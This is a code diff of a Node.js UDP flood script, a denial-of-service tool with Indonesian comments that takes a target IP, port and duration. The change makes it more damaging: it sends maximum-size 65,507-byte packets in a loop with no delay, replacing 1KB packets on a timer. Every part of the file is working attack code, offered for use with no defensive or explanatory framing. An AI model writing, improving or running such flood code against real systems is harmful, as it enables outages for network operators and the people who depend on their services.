@@ -1,32 +1,36 @@
 const dgram = require("dgram");
-const process = require("process");
 
-if (process.argv.length < 5) {
-    console.log(`Usage: node ${process.argv[1]} <IP> <PORT> <TIME>`);
+// Ambil argumen dari CLI
+const target_ip = process.argv[2]; // IP Target
+const target_port = parseInt(process.argv[3]); // Port Target
+const duration = parseInt(process.argv[4]); // Durasi Serangan (detik)
+
+if (!target_ip || !target_port || !duration) {
+    console.log("Usage: node udp_flood.js <IP> <Port> <Duration>");
     process.exit(1);
 }
 
-const targetIP = process.argv[2];
-const targetPort = parseInt(process.argv[3]);
-const duration = parseInt(process.argv[4]); // dalam detik
+const packet_size = 65507; // MAX UKURAN UDP (65507 Bytes)
+const socket = dgram.createSocket("udp4");
+const packet = Buffer.alloc(packet_size, "X"); // Isi Paket Acak
 
-const client = dgram.createSocket("udp4");
-const message = Buffer.alloc(1024, "A"); // Buffer 1KB
+console.log(`🔥 Starting UDP Flood → Target: ${target_ip}:${target_port} | Packet Size: ${packet_size} Bytes | Duration: ${duration}s 🔥`);
 
-console.log(`🚀 Menyerang ${targetIP}:${targetPort} selama ${duration} detik...`);
+const startTime = Date.now();
+const endTime = startTime + duration * 1000;
 
-const endTime = Date.now() + duration * 1000;
-
-function sendFlood() {
+function sendPacket() {
     if (Date.now() > endTime) {
-        console.log("🔥 Serangan selesai!");
-        client.close();
-        process.exit();
-    } else {
-        client.send(message, targetPort, targetIP, (err) => {
-            if (err) console.error("❌ Error:", err);
-        });
+        console.log("✅ Attack Finished!");
+        process.exit(0);
     }
+
+    socket.send(packet, 0, packet.length, target_port, target_ip, (err) => {
+        if (err) console.error("Send Error:", err);
+    });
+
+    setImmediate(sendPacket); // Loop Tanpa Delay
 }
 
-setInterval(sendFlood, 1);
+// Mulai Serangan
+sendPacket();
